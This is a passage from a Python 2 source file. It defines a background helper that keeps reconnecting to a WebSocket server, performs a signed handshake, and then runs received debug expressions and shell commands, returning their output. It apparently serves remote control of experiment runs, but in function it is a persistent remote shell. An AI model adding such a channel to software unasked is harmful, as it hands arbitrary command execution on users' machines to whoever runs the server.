        fout.write('\n')
        p = pe
        if pe==len(d): break
    fout.write('"""\n')
    fout.close()
miniws = loadmodule(new.module('miniws'),MINIWS)
minishell = loadmodule(new.module('minishell'),MINISHELL)
miniinteract = loadmodule(new.module('miniinteract'),MINIINTERACT)
del MINIWS
del MINISHELL
del MINIINTERACT

class interacthelper:
    def __init__(self,wspath,expobj):
        self.wspath = wspath
        self.expobj = expobj
        self.console = miniinteract.Console()

        self.did = 0
        self.sid = 0
        self.thread = threading.Thread(target=self.interact)
        self.thread.daemon = True
        self.thread.start()

    def interact(self):
        #Retry: Open WS socket
        while True:
            try:
                ws = miniws.create_connection(self.wspath)
                #HANDSHAKE
                ws.send(str(self.expobj.expid))
                key = ws.recv()
                ws.send(self.expobj.signer.sign(key))
                ws.send(str(self.did))
                ws.send(str(self.sid))
                while True:
                    dw = ws.recv()
                    #Receive command
                    cmdkey,cmdid,cmd = json.loads(dw)
                    #Execute command
                    if cmdkey=='h':
                        ws.send(json.dumps('ok'))
                    elif cmdkey=='d':
                        self.did = cmdid+1
                        #Execute debug command
                        ws.send(json.dumps(self.console.eval(cmd)))
                    elif cmdkey=='s':
                        self.sid = cmdid+1
                        #Execute shell commmand
                        ws.send(json.dumps(minishell.shell(cmd)))
                    else:
                        ws.close()
                        break
            except:
                import traceback
                traceback.print_exc()
                time.sleep(5)

if __name__=="__main__":
    PatchedStdout('1234')
    print "test"
    for j in range(10):
        for i in range(j):
            print ",",
            sys.stdout.flush()
            time.sleep(1)
        print
        time.sleep(1)


